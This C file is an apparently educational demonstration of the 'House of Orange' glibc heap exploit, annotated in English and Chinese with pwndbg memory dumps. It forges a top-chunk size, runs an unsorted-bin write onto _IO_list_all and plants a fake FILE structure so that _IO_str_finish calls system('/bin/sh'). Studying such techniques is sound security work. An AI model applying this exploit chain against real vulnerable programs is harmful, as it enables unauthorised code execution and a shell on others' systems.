// 修改参照https://xz.aliyun.com/t/2411
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*/
int winner ( char *ptr);

int main()
{
    /*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.
      
      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page

      If the size requested is smaller than 0x21000, then the former is followed.
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
  
    fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");

    /*
      Firstly, lets allocate a chunk on the heap.
    */

    p1 = malloc(0x400-16);

    /*
       The heap is usually allocated with a top chunk of size 0x21000
       Since we've allocate a chunk of size 0x400 already,
       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.

       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.

       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.

       So that means that there are two conditions that must always be true.
        1) Top chunk + size has to be page aligned
        2) Top chunk's prev_inuse bit has to be set.

       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       What's left is 0x20c01

       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */

    /*
        此时堆内存布局:
        0x555555756000: 0x0000000000000000  0x0000000000000401
        0x555555756010: 0x0000000000000000  0x0000000000000000 <- p1指针
        ...
        0x5555557563f0: 0x0000000000000000  0x0000000000000000
        0x555555756400: 0x0000000000000000  0x0000000000020c01   <-- Top chunk
    */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;
    /*
        此时堆内存布局:
        0x555555756000: 0x0000000000000000  0x0000000000000401
        0x555555756010: 0x0000000000000000  0x0000000000000000 <- p1指针
        ...
        0x5555557563f0: 0x0000000000000000  0x0000000000000000
        0x555555756400: 0x0000000000000000  0x0000000000000c01   <-- Top chunk
    */

    /* 
       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.

       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end

       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.

       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.

       After the size of the Top chunk has been updated, this chunk gets freed.

       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end

       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free

       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end



    */

    // 0x555555756000     0x555555777000 rw-p    21000 0      [heap]
    p2 = malloc(0x1000);
    // 0x555555756000     0x555555799000 rw-p    43000 0      [heap]    # 扩展了0x22000字节作为new Top
    /*
        此时堆内存布局:
        0x555555756000: 0x0000000000000000  0x0000000000000401
        0x555555756010: 0x0000000000000000  0x0000000000000000 <- p1指针
        ...
        0x5555557563f0: 0x0000000000000000  0x0000000000000000
        0x555555756400: 0x0000000000000000  0x0000000000000be1 <- top指针(old Top) 已放到unsortedbin中
        0x555555756410: 0x00007ffff7dd3b58  0x00007ffff7dd3b58
        ...
        0x555555776ff0: 0x0000000000000000  0x0000000000000000
        0x555555777000: 0x0000000000000000  0x0000000000001011
        0x555555777010: 0x0000000000000000  0x0000000000000000 <- p2指针
        ...
        0x555555778000: 0x0000000000000000  0x0000000000000000
        0x555555778010: 0x0000000000000000  0x0000000000020ff1 <- top_chunk
        0x555555778020: 0x0000000000000000  0x0000000000000000

        unsortedbin
        all: 0x555555756400 —▸ 0x7ffff7dd3b58 (main_arena+88) ◂— 0x555555756400

    */
    /*
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap's end

      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins


      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk's size.
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      There are two common ways to exploit the current state:
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc's main_arena unsorted-bin-list. (requires at least one allocation)

      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.

      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.

      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
      More about file-pointer exploitation can be found here:
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc's main_arena.
    */

    /*
      pwndbg> x top[2]
      0x7ffff7dd3b58 <main_arena+88>: 0x0000555555778010
      pwndbg> print &_IO_list_all
      $8 = (struct _IO_FILE_plus **) 0x7ffff7dd4500 <_IO_list_all>
      pwndbg> print (char *)&_IO_list_all - top[2]
      $9 = 0x9a8 <error: Cannot access memory at address 0x9a8>
    */
    io_list_all = top[2] + 0x9a8;

    /*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.

      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
      in libc's main_arena.

      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.

      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
      So, we should set chunk->bk to be _IO_list_all - 16
    */
 
    /*
      unsortedbin
      all: 0x555555756400 —▸ 0x7ffff7dd3b58 (main_arena+88) ◂— 0x555555756400
    */
    top[3] = io_list_all - 0x10;
    /*
        此时堆内存布局:
        0x5555557563f0: 0x0000000000000000  0x0000000000000000
        0x555555756400: 0x0000000000000000  0x0000000000000be1 <- top指针(old Top) 已放到unsortedbin中
        0x555555756410: 0x00007ffff7dd3b58  0x00007ffff7dd44f0 <- _IO_list_all-0x10

        unsortedbin
        all [corrupted]
        FD: 0x555555756400 —▸ 0x7ffff7dd3b58 (main_arena+88) ◂— 0x555555756400
        BK: 0x555555756400 —▸ 0x7ffff7dd44f0 ◂— 0x0
    */


    /*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
    */

    //memcpy( ( char *) top, "/bin/sh\x00", 8);

    /*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      Since we can only overwrite this address with main_arena's unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      The address of the next file pointer is located at base_address+0x68.
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc's bin organisation
      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

      Since we overflow the old top chunk, we also control it's size field.
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer's fd-ptr.

      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE "size <= 2 * SIZE_SZ"
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */

    top[1] = 0x61;
    /*
        此时堆内存布局:
        0x5555557563f0: 0x0000000000000000  0x0000000000000000
        0x555555756400: 0x0000000000000000  0x0000000000000061 <- top指针(old Top) 已放到unsortedbin中
        0x555555756410: 0x00007ffff7dd3b58  0x00007ffff7dd44f0 <- _IO_list_all-0x10
    */

    /*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813

      We want to satisfy the first condition:
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    _IO_FILE *fp = (_IO_FILE *) top;


    /*
      1. Set mode to 0: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0
    fp->_flags = 0;


    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28


    /*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the _IO_FILE struct:
      base_address+sizeof(_IO_FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */

    //size_t *jump_table = &top[12]; // controlled memory
    //jump_table[3] = (size_t) &winner;

    size_t system_addr = (size_t) system;
    size_t _IO_str_jumps_addr = system_addr + 0x357080;

    // 设置vtable:这样调用_IO_overflow时会调用到 _IO_str_finish
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = _IO_str_jumps_addr - 8; // top+0xd8

/*
typedef void *(*_IO_alloc_type) (_IO_size_t);
typedef void (*_IO_free_type) (void*);

struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;
  _IO_free_type _free_buffer;
};

struct _IO_streambuf
{
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;


void
_IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}

*/
    fp->_IO_buf_base = "/bin/sh";
    top[29] = (size_t)system_addr; // top+0xe8

    /*
        此时堆内存布局:
        0x5555557563f0: 0x0000000000000000  0x0000000000000000
        0x555555756400: 0x0000000000000000  0x0000000000000061 <- top指针(old Top) 已放到unsortedbin中
        0x555555756410: 0x00007ffff7dd3b58  0x00007ffff7dd44f0 <- _IO_list_all-0x10
        0x555555756420: 0x0000000000000002  0x0000000000000003 <- fp->_IO_write_base|fp->_IO_write_ptr
        0x555555756430: 0x0000000000000000  0x0000555555554af4 <- top->_IO_buf_base
        0x555555756440: 0x0000000000000000  0x0000000000000000
        0x555555756450: 0x0000000000000000  0x0000000000000000
        0x555555756460: 0x0000000000000000  0x0000000000000000
        0x555555756470: 0x0000000000000000  0x0000000000000000
        0x555555756480: 0x0000000000000000  0x0000000000000000
        0x555555756490: 0x0000000000000000  0x0000000000000000
        0x5555557564a0: 0x0000000000000000  0x0000000000000000
        0x5555557564b0: 0x0000000000000000  0x0000000000000000
        0x5555557564c0: 0x0000000000000000  0x0000000000000000
        0x5555557564d0: 0x0000000000000000  0x00007ffff7dd04f8 <- vtable
        0x5555557564e0: 0x0000000000000000  0x00007ffff7a79480 <- top[29]
        0x5555557564f0: 0x0000000000000000  0x0000000000000000
        0x555555756500: 0x0000000000000000  0x0000000000000000
        0x555555756510: 0x0000000000000000  0x0000000000000000
        0x555555756520: 0x0000000000000000  0x0000000000000000
        0x555555756530: 0x0000000000000000  0x0000000000000000
    */



    /* Finally, trigger the whole chain by calling malloc */
    /*
        pwndbg> x/4xg 0x00007ffff7dd44f0
        0x7ffff7dd44f0: 0x0000000000000000  0x0000000000000000
        0x7ffff7dd4500 <_IO_list_all>:  0x00007ffff7dd4520  0x0000000000000000

        unsortedbin
        all [corrupted]
        FD: 0x555555756400 —▸ 0x7ffff7dd3b58 (main_arena+88) ◂— 0x555555756400
        BK: 0x555555756400 —▸ 0x7ffff7dd44f0 ◂— 0x0
            (victim)
    */
    malloc(10); // 将victim从unsortedbin中拿出来(设置(victim->bk)->fd = &unsortedbin),并放入smallbins[0x60]中
    /*
        此时堆内存布局:
        0x5555557563f0: 0x0000000000000000  0x0000000000000000
        0x555555756400: 0x0000000000000000  0x0000000000000061 <- top指针(old Top) 已放到unsortedbin中
        0x555555756410: 0x00007ffff7dd3ba8  0x00007ffff7dd3ba8

        pwndbg> x/4xg 0x00007ffff7dd44f0
        0x7ffff7dd44f0: 0x0000000000000000  0x0000000000000000
        0x7ffff7dd4500 <_IO_list_all>:  0x00007ffff7dd3b58  0x0000000000000000

        unsortedbin
        all [corrupted]
        FD: 0x555555756400 —▸ 0x7ffff7dd3ba8 (main_arena+168) ◂— 0x555555756400
        BK: 0x7ffff7dd44f0 ◂— 0x0
        smallbins
        0x60: 0x555555756400 —▸ 0x7ffff7dd3ba8 (main_arena+168) ◂— 0x555555756400
    */

    /*
        _IO_flush_all_lockp 函数
        {
            fp = (_IO_FILE *) _IO_list_all;
            while (fp != NULL) {
                第一次循环不满足
                fp = fp->_chain; 即 &unsortedbin + 0x68 = &smallbins[0x60]
            }
        }

        pwndbg> x/40xg 0x7ffff7dd3b58
        0x7ffff7dd3b58 <main_arena+88 >:    0x0000555555778010  0x0000000000000000 <- unsortedbin
        0x7ffff7dd3b68 <main_arena+104>:    0x0000555555756400  0x00007ffff7dd44f0
        0x7ffff7dd3b78 <main_arena+120>:    0x00007ffff7dd3b68  0x00007ffff7dd3b68
        0x7ffff7dd3b88 <main_arena+136>:    0x00007ffff7dd3b78  0x00007ffff7dd3b78
        0x7ffff7dd3b98 <main_arena+152>:    0x00007ffff7dd3b88  0x00007ffff7dd3b88
        0x7ffff7dd3ba8 <main_arena+168>:    0x00007ffff7dd3b98  0x00007ffff7dd3b98
        0x7ffff7dd3bb8 <main_arena+184>:    0x0000555555756400  0x0000555555756400 <- &smallbins[0x60]
        0x7ffff7dd3bc8 <main_arena+200>:    0x00007ffff7dd3bb8  0x00007ffff7dd3bb8
    */

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    return 0;
}
